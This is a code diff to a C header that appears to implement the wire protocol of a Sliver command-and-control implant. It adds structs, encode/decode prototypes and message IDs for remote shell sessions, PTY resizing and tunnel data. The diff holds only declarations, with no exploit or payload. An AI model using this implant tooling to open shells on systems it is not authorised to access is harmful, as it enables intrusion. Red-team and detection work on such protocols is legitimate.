@@ -197,7 +197,36 @@ int sliver_upload_req_decode(const void *data, size_t len, sliver_upload_req_t *
 int sliver_upload_encode(sliver_buf_t *out, const char *path, int written, int failed,
                          const char *err);
 
-/* --- Execute ------------------------------------------------------------ */
+/* --- Shell / Tunnel ----------------------------------------------------- */
+#define SLIVER_SHELL_MAX_PATH 1024
+
+typedef struct {
+  char path[SLIVER_SHELL_MAX_PATH];
+  int enable_pty;
+  uint32_t pid;
+  uint32_t rows;
+  uint32_t cols;
+  uint64_t tunnel_id;
+} sliver_shell_req_t;
+
+typedef struct {
+  const void *data;
+  size_t data_len;
+  int closed;
+  uint64_t sequence;
+  uint64_t ack;
+  uint64_t tunnel_id;
+} sliver_tunnel_data_t;
+
+/* ShellReq{Path=1,EnablePTY=2,Pid=3,Rows=4,Cols=5,TunnelID=8}. */
+int sliver_shell_req_decode(const void *data, size_t len, sliver_shell_req_t *out);
+/* Shell{Path=1,EnablePTY=2,Pid=3,TunnelID=8,Response=9}. */
+int sliver_shell_encode(sliver_buf_t *out, const char *path, int pty, uint32_t pid,
+                        uint64_t tunnel_id, const char *err);
+/* TunnelData{Data=1,Closed=2,Sequence=3,Ack=4,TunnelID=8}. */
+int sliver_tunnel_data_decode(const void *data, size_t len, sliver_tunnel_data_t *out);
+int sliver_tunnel_data_encode(sliver_buf_t *out, const void *payload, size_t payload_len,
+                              int closed, uint64_t sequence, uint64_t tunnel_id);
 #define SLIVER_EXEC_MAX_ARGS 32
 
 typedef struct {
@@ -238,6 +267,11 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #define SLIVER_MSG_UPLOAD_REQ 9u
 #define SLIVER_MSG_UPLOAD 10u
 #define SLIVER_MSG_EXECUTE_REQ 44u
+#define SLIVER_MSG_SHELL_REQ 20u
+#define SLIVER_MSG_SHELL 21u
+#define SLIVER_MSG_TUNNEL_DATA 22u
+#define SLIVER_MSG_TUNNEL_CLOSE 23u
+#define SLIVER_MSG_SHELL_RESIZE_REQ 135u
 #define SLIVER_MSG_BEACON_REGISTER 93u
 #define SLIVER_MSG_BEACON_TASKS 94u
 
@@ -246,4 +280,5 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #endif
 
 #endif /* SLIVER_PROTO_H */
+
 
